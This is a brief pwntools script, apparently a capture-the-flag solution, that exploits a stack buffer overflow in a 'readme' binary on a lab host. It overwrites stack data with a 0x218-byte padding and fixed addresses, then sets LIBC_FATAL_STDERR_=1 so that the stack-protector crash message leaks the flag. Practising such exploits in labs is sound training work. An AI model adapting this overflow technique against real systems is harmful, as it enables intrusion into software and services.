from pwn import *
context.log_level="DEBUG"

conn=remote("10.131.1.19",60005)
# conn=process("./readme")

payload="a"*0x218+p64(0x400d21)+p64(0)+p64(0x600d20)
conn.sendlineafter("What's your name? ",payload)
conn.sendlineafter("Please overwrite the flag: ","LIBC_FATAL_STDERR_=1\x00")
conn.recv()

conn.recv()